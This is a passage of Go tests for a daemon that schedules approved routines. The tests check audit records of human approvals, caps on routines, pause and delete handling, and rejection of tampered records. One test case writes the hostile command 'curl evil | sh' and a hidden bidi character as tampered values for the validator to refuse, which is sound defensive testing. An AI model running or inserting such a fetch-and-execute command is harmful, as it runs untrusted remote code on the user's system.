// runs as any user. It returns the way back.
func blockRoom(t *testing.T) (restore func()) {
	t.Helper()
	head := filepath.Join(talkoot.Dir(), "crew", talkoot.HeadFile)
	aside := head + ".aside"
	if err := os.Rename(head, aside); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(head, "keep"), 0o700); err != nil {
		t.Fatal(err)
	}
	return func() {
		t.Helper()
		if err := os.RemoveAll(head); err != nil {
			t.Fatal(err)
		}
		if err := os.Rename(aside, head); err != nil {
			t.Fatal(err)
		}
	}
}

// 🚨 The room is the record of what a person approved. An approval that the
// room cannot record stores no routine and leaves no timer, and the card
// waits.
func TestAnApprovalThatTheRoomCannotRecordStoresNothing(t *testing.T) {
	w, seat, _, _ := routineCrew(t, `{"max": 3}`)
	r, err := seat.ProposeRoutine(ciTask, "Watch CI.")
	if err != nil {
		t.Fatal(err)
	}
	restore := blockRoom(t)
	_, err = decide(t, w, r.Proposal.ID, ctrlproto.TalkootDecisionApprove)
	restore()
	if err == nil || !strings.Contains(err.Error(), "the room could not record the approval") {
		t.Fatalf("want a refusal that names the room, got %v", err)
	}
	if ts := routineTimers(w); len(ts) != 0 {
		t.Fatalf("the timer must be removed again: %+v", ts)
	}
	if v := routinesView(t, w); len(v.Routines) != 0 {
		t.Fatalf("the routine's file must be removed again: %+v", v.Routines)
	}
	cards := inbox(t, w)
	if len(cards) != 1 || cards[0].Proposal.Status != talkoot.ProposalPending || cards[0].Proposal.DecidedBy != "" {
		t.Fatalf("the card must wait again, with no decision on it: %+v", cards)
	}
	// With the room back, the same card is approved.
	if _, err := decide(t, w, r.Proposal.ID, ctrlproto.TalkootDecisionApprove); err != nil {
		t.Fatal(err)
	}
	if len(routineTimers(w)) != 1 || len(routineLines(t)) != 1 {
		t.Error("the second approval must store the routine")
	}
}

// A resume that the room cannot record leaves the routine paused.
func TestAResumeThatTheRoomCannotRecordStaysPaused(t *testing.T) {
	w, seat, _, _ := routineCrew(t, `{"max": 3}`)
	rid := approved(t, w, seat, ciTask)
	if _, err := setRoutine(t, w, rid, ctrlproto.TalkootRoutinePause, ""); err != nil {
		t.Fatal(err)
	}
	restore := blockRoom(t)
	_, err := setRoutine(t, w, rid, ctrlproto.TalkootRoutineResume, "")
	restore()
	if err == nil || !strings.Contains(err.Error(), "stays paused") {
		t.Fatalf("want a refusal that says the routine stays paused, got %v", err)
	}
	if v := routinesView(t, w); v.Routines[0].Status != talkoot.RoutinePaused || len(routineTimers(w)) != 0 {
		t.Fatalf("the routine must stay paused, with no timer: %+v", v.Routines)
	}
}

// 🚨 A pause is a safety action, so it does not wait for the room: the file
// and the timer change first. The room is still the record of who paused a
// routine, so the second try writes the line that the first one could not.
func TestAPauseThatTheRoomCouldNotRecordIsRecordedOnTheNextTry(t *testing.T) {
	w, seat, _, _ := routineCrew(t, `{"max": 3}`)
	rid := approved(t, w, seat, ciTask)
	restore := blockRoom(t)
	_, err := setRoutine(t, w, rid, ctrlproto.TalkootRoutinePause, "Too noisy.")
	restore()
	if err == nil || !strings.Contains(err.Error(), "Pause it again") {
		t.Fatalf("want an error that says to pause again, got %v", err)
	}
	if v := routinesView(t, w); v.Routines[0].Status != talkoot.RoutinePaused || len(routineTimers(w)) != 0 {
		t.Fatalf("the routine must be paused with no timer, whatever the room did: %+v", v.Routines)
	}
	if n := len(routineLines(t)); n != 1 {
		t.Fatalf("the blocked room must hold the approval alone, got %d lines", n)
	}
	// The second try gives another reason. The line records the pause that
	// happened, with its own reason.
	if _, err := setRoutine(t, w, rid, ctrlproto.TalkootRoutinePause, "Another reason."); err != nil {
		t.Fatal(err)
	}
	ls := routineLines(t)
	if len(ls) != 2 || ls[1].Action != talkoot.ActionPaused || ls[1].By != "human:sothr" || ls[1].Reason != "Too noisy." || ls[1].Ref != rid {
		t.Fatalf("the second try must write the pause that the room does not hold: %+v", ls)
	}
	if _, err := setRoutine(t, w, rid, ctrlproto.TalkootRoutinePause, ""); err != nil {
		t.Fatal(err)
	}
	if n := len(routineLines(t)); n != 2 {
		t.Errorf("a third pause wrote a second line: %d lines", n)
	}
}

// The same for a delete. Its file is gone after the first try, so the room
// says that the id named a routine, and whether its deletion is recorded.
func TestADeleteThatTheRoomCouldNotRecordIsRecordedOnTheNextTry(t *testing.T) {
	w, seat, _, _ := routineCrew(t, `{"max": 3}`)
	rid := approved(t, w, seat, ciTask)
	restore := blockRoom(t)
	_, err := setRoutine(t, w, rid, ctrlproto.TalkootRoutineDelete, "Done.")
	restore()
	if err == nil || !strings.Contains(err.Error(), "Delete it again") {
		t.Fatalf("want an error that says to delete again, got %v", err)
	}
	if v := routinesView(t, w); len(v.Routines) != 0 || len(routineTimers(w)) != 0 {
		t.Fatalf("the routine and its timer must be gone, whatever the room did: %+v", v.Routines)
	}
	if _, err := setRoutine(t, w, rid, ctrlproto.TalkootRoutineDelete, "Done."); err != nil {
		t.Fatal(err)
	}
	ls := routineLines(t)
	if len(ls) != 2 || ls[1].Action != talkoot.RoutineDeleted || ls[1].Member != "helm" || ls[1].Ref != rid || ls[1].Reason != "Done." {
		t.Fatalf("the second try must write the deletion, with the routine's member: %+v", ls)
	}
	if _, err := setRoutine(t, w, rid, ctrlproto.TalkootRoutineDelete, ""); talkootCode(err) != ctrlproto.CodeNotFound {
		t.Errorf("a third delete: %v", err)
	}
	if n := len(routineLines(t)); n != 2 {
		t.Errorf("a third delete wrote a line: %d lines", n)
	}
	// An id that the room never held names no routine.
	if _, err := setRoutine(t, w, talkoot.NewProposalID(time.Now()), ctrlproto.TalkootRoutineDelete, ""); talkootCode(err) != ctrlproto.CodeNotFound {
		t.Errorf("a delete of an unknown id: %v", err)
	}
}

// 🚨 A daemon that stops between a routine's file and its timer leaves an
// active routine that never runs. The next start sets the timer.
func TestAnActiveRoutineWithNoTimerGetsOneAtStart(t *testing.T) {
	w, seat, clock, cwd := routineCrew(t, `{"max": 3}`)
	active := approved(t, w, seat, ciTask)
	daily := ciTask
	daily.Schedule = "daily 07:30"
	paused := approved(t, w, seat, daily)
	if _, err := setRoutine(t, w, paused, ctrlproto.TalkootRoutinePause, ""); err != nil {
		t.Fatal(err)
	}
	if ok, err := w.Timers().Cancel(routineTimerOwner, active); err != nil || !ok {
		t.Fatalf("cancel: %v %v", ok, err)
	}
	// Two routines approved in one millisecond have no fixed order, so the
	// routine is found by its id.
	said := false
	for _, r := range routinesView(t, w).Routines {
		if r.ID == active {
			said = strings.Contains(r.Problem, "no timer")
		} else if r.Problem != "" {
			t.Errorf("a paused routine needs no timer, and the view gave it a problem: %+v", r)
		}
	}
	if !said {
		t.Fatalf("the view must say that an active routine has no timer: %+v", routinesView(t, w).Routines)
	}
	_ = w.Close()

	// With routines off, the start sets nothing.
	routinesConfig(t, "")
	off := wakeDaemon(t, cwd, clock, okProvider)
	if ts := routineTimers(off); len(ts) != 0 {
		t.Fatalf("a daemon with routines off must set no timer: %+v", ts)
	}
	_ = off.Close()

	routinesConfig(t, `{"max": 3}`)
	w2 := wakeDaemon(t, cwd, clock, okProvider)
	ts := routineTimers(w2)
	if len(ts) != 1 || ts[0].ID != active || ts[0].Schedule.String() != "every 15m" {
		t.Fatalf("the start must set the timer of the active routine, and of no paused one: %+v", ts)
	}
}

// editRoutine changes the record of the crew's routine rid as a hand does.
func editRoutine(t *testing.T, rid string, change func(m map[string]any)) {
	t.Helper()
	path := filepath.Join(talkoot.Dir(), "crew", talkoot.RoutinesDir, rid+".json")
	raw, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	m := map[string]any{}
	if err := json.Unmarshal(raw, &m); err != nil {
		t.Fatal(err)
	}
	change(m)
	if raw, err = json.Marshal(m); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, raw, 0o600); err != nil {
		t.Fatal(err)
	}
}

// 🚨 A record that does not read still has its file, and maybe its timer. It
// holds its place under the cap until a person deletes it. Otherwise a team
// could hold more routines than the person allowed.
func TestADamagedRoutineHoldsItsPlaceUnderTheCap(t *testing.T) {
	w, seat, _, _ := routineCrew(t, `{"max": 1}`)
	// The ask is made while the team holds no routine, so its card waits.
	r, err := seat.ProposeRoutine(ciTask, "Watch CI.")
	if err != nil {
		t.Fatal(err)
	}
	dir := filepath.Join(talkoot.Dir(), "crew", talkoot.RoutinesDir)
	if err := os.MkdirAll(dir, 0o700); err != nil {
		t.Fatal(err)
	}
	broken := talkoot.NewProposalID(time.Now().Add(-time.Hour))
	if err := os.WriteFile(filepath.Join(dir, broken+".json"), []byte("{"), 0o600); err != nil {
		t.Fatal(err)
	}
	_, err = decide(t, w, r.Proposal.ID, ctrlproto.TalkootDecisionApprove)
	if err == nil || !strings.Contains(err.Error(), "the limit is 1") {
		t.Fatalf("an approval beside a damaged record must be refused with the cap named, got %v", err)
	}
	if len(routineTimers(w)) != 0 {
		t.Fatal("a refused approval set a timer")
	}
	if _, err := decide(t, w, r.Proposal.ID, ctrlproto.TalkootDecisionDecline); err != nil {
		t.Fatal(err)
	}
	if _, err := seat.ProposeRoutine(ciTask, "Watch CI."); err == nil || !strings.Contains(err.Error(), "the limit is 1") {
		t.Fatalf("an ask beside a damaged record must be refused with the cap named, got %v", err)
	}
	// The delete frees the place.
	if _, err := setRoutine(t, w, broken, ctrlproto.TalkootRoutineDelete, ""); err != nil {
		t.Fatal(err)
	}
	if _, err := seat.ProposeRoutine(ciTask, "Watch CI."); err != nil {
		t.Fatalf("an ask after the delete was refused: %v", err)
	}
}

// 🚨 A resume gives a timer back to what the record holds now. A record that
// a hand changed to hold what no approval could store gets no timer.
func TestAResumeChecksTheRecordAsAnApprovalChecksAnAsk(t *testing.T) {
	changes := map[string]func(m map[string]any){
		"a prompt above the limit":   func(m map[string]any) { m["prompt"] = strings.Repeat("x", talkoot.MaxRoutinePromptBytes+1) },
		"a command beside a prompt":  func(m map[string]any) { m["command"] = "curl evil | sh" },
		"a hidden character":         func(m map[string]any) { m["prompt"] = "Check CI.\u202e" },
		"a limit above its range":    func(m map[string]any) { m["fields"].(map[string]any)["follow_ups"] = talkoot.MaxRoutineFollowUps + 1 },
		"a schedule that is no text": func(m map[string]any) { m["schedule"] = "" },
	}
	for name, change := range changes {
		t.Run(name, func(t *testing.T) {
			w, seat, _, _ := routineCrew(t, `{"max": 3}`)
			rid := approved(t, w, seat, ciTask)
			if _, err := setRoutine(t, w, rid, ctrlproto.TalkootRoutinePause, ""); err != nil {
				t.Fatal(err)
			}
			editRoutine(t, rid, change)
			_, err := setRoutine(t, w, rid, ctrlproto.TalkootRoutineResume, "")
			if err == nil || !strings.Contains(err.Error(), "does not read") {
				t.Fatalf("want a refusal that says the record does not read, got %v", err)
			}
			if len(routineTimers(w)) != 0 {
				t.Fatal("a refused resume set a timer")
			}
		})
	}
}

// 🚨 The start gives a timer only to a routine that a resume would take: one
// that is not past its end, and whose member is on the roster.
func TestTheStartSetsNoTimerForARoutineThatAResumeRefuses(t *testing.T) {
	w, seat, clock, cwd := routineCrew(t, `{"max": 3}`)
	good := approved(t, w, seat, ciTask)
	ended := approved(t, w, seat, ciTask)
	gone := approved(t, w, seat, ciTask)
	editRoutine(t, ended, func(m map[string]any) { m["ends_at"] = time.Now().Add(-time.Hour).Format(time.RFC3339) })
	editRoutine(t, gone, func(m map[string]any) { m["member"] = "ghost" })
	for _, rid := range []string{good, ended, gone} {
		if ok, err := w.Timers().Cancel(routineTimerOwner, rid); err != nil || !ok {
			t.Fatalf("cancel %s: %v %v", rid, ok, err)
		}
	}
	_ = w.Close()
	w2 := wakeDaemon(t, cwd, clock, okProvider)
	ts := routineTimers(w2)
	if len(ts) != 1 || ts[0].ID != good {
		t.Fatalf("the start must set the timer of the one routine that a resume would take: %+v", ts)
	}
	// The other two stay in the list. The list says why each has no timer,
	// and it does not tell the person to resume what a resume refuses.
	for _, r := range routinesView(t, w2).Routines {
		want := map[string]string{ended: "ended on", gone: "ghost left the roster"}[r.ID]
		if r.ID == good {
			continue
		}
		if !strings.Contains(r.Problem, "no timer") || !strings.Contains(r.Problem, want) || strings.Contains(r.Problem, "resume it") {
			t.Errorf("routine %s must say that it has no timer because %q, with no advice to resume: %q", r.ID, want, r.Problem)
		}
	}
}

// 🚨 An approval writes the routine's file and then the room's line, and it
// removes the file when the line fails. A file that stayed, after a failed
// removal or a stop between the two writes, has no approval on record. The
// room's line has a seal and the file has none, so no timer is set for it.
func TestARoutineThatTheRoomHoldsNoApprovalOfGetsNoTimer(t *testing.T) {
	w, seat, clock, cwd := routineCrew(t, `{"max": 3}`)
	good := approved(t, w, seat, ciTask)
	// The file of an approval that failed after its file was written.
	left := talkoot.NewProposalID(time.Now())
	dir := filepath.Join(talkoot.Dir(), "crew")
	stray := talkoot.NewRoutine(left, "helm", ciTask, "every 15m", talkoot.RoutineFields{SpendUSDPerDay: 5}, "human:sothr", time.Now())
	if err := talkoot.SaveRoutine(dir, stray); err != nil {
		t.Fatal(err)
	}
	if ok, err := w.Timers().Cancel(routineTimerOwner, good); err != nil || !ok {
		t.Fatalf("cancel: %v %v", ok, err)
	}
	_ = w.Close()
	w2 := wakeDaemon(t, cwd, clock, okProvider)
	ts := routineTimers(w2)
	if len(ts) != 1 || ts[0].ID != good {
		t.Fatalf("the start must set the timer of the approved routine alone: %+v", ts)
	}
	listed := false
	for _, r := range routinesView(t, w2).Routines {
		if r.ID == left {
			listed = strings.Contains(r.Problem, "the room holds no approval")
		}
	}
	if !listed {
		t.Errorf("the list must hold the routine and say that the room holds no approval of it: %+v", routinesView(t, w2).Routines)
	}
	// A pause is safe, so it passes. The resume after it must not be the
	// way to a timer.
	if _, err := setRoutine(t, w2, left, ctrlproto.TalkootRoutinePause, ""); err != nil {
		t.Fatal(err)
	}
	if _, err := setRoutine(t, w2, left, ctrlproto.TalkootRoutineResume, ""); err == nil || !strings.Contains(err.Error(), "the room holds no approval") {
		t.Fatalf("want a refusal that names the missing approval, got %v", err)
	}
	if ts := routineTimers(w2); len(ts) != 1 {
		t.Fatalf("a refused resume set a timer: %+v", ts)
	}
	if _, err := setRoutine(t, w2, left, ctrlproto.TalkootRoutineDelete, ""); err != nil {
		t.Fatal(err)
	}
}

// 🚨 A deletion is final. A file that comes back, from a backup or a stray
// write, is the same as its approval, so the approval's line alone would
// give it a timer again. The room also says that a person deleted it.
func TestADeletedRoutineWhoseFileCameBackGetsNoTimer(t *testing.T) {
	w, seat, clock, cwd := routineCrew(t, `{"max": 3}`)
	rid := approved(t, w, seat, ciTask)
	path := filepath.Join(talkoot.Dir(), "crew", talkoot.RoutinesDir, rid+".json")
	kept, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := setRoutine(t, w, rid, ctrlproto.TalkootRoutineDelete, "Done."); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, kept, 0o600); err != nil {
		t.Fatal(err)
	}
	_ = w.Close()
	w2 := wakeDaemon(t, cwd, clock, okProvider)
	if ts := routineTimers(w2); len(ts) != 0 {
		t.Fatalf("the start gave a timer to a routine that a person deleted: %+v", ts)
	}
	v := routinesView(t, w2)
	if len(v.Routines) != 1 || !strings.Contains(v.Routines[0].Problem, "a person deleted routine") {
		t.Fatalf("the list must say that a person deleted the routine: %+v", v.Routines)
	}
	// The same file as a paused routine does not resume.
	editRoutine(t, rid, func(m map[string]any) { m["status"] = "paused" })
	if _, err := setRoutine(t, w2, rid, ctrlproto.TalkootRoutineResume, ""); err == nil || !strings.Contains(err.Error(), "a person deleted routine") {
		t.Fatalf("want a refusal that names the deletion, got %v", err)
	}
	if ts := routineTimers(w2); len(ts) != 0 {
		t.Fatalf("a refused resume set a timer: %+v", ts)
	}
	if _, err := setRoutine(t, w2, rid, ctrlproto.TalkootRoutineDelete, ""); err != nil {
		t.Fatal(err)
	}
}

// A routine's record that does not read is named in the view, and a delete
// clears it.
func TestADamagedRoutineShowsAndADeleteClearsIt(t *testing.T) {
	w, seat, _, _ := routineCrew(t, `{"max": 1}`)
	rid := approved(t, w, seat, ciTask)
	path := filepath.Join(talkoot.Dir(), "crew", talkoot.RoutinesDir, rid+".json")
	if err := os.WriteFile(path, []byte("{"), 0o600); err != nil {
		t.Fatal(err)
	}
	v := routinesView(t, w)
	if len(v.Routines) != 1 || v.Routines[0].ID != rid || !strings.Contains(v.Routines[0].Problem, "does not read") {
		t.Fatalf("the view must name the record that does not read: %+v", v.Routines)
	}
	if _, err := setRoutine(t, w, rid, ctrlproto.TalkootRoutineResume, ""); err == nil {
		t.Error("a record that does not read was resumed")
	}
	got, err := setRoutine(t, w, rid, ctrlproto.TalkootRoutineDelete, "")
	if err != nil {
		t.Fatal(err)
	}
	if len(got.Routines) != 0 || len(routineTimers(w)) != 0 {
		t.Fatalf("the delete must clear the record and its timer: %+v", got)
	}
	// The record no longer names its member, and the room's earlier line
	// does. The deletion's line names the member from there.
	if ls := routineLines(t); len(ls) != 2 || ls[1].Action != talkoot.RoutineDeleted || ls[1].Member != "helm" {
		t.Fatalf("the deletion of a damaged record must name the routine's member: %+v", ls)
	}
}
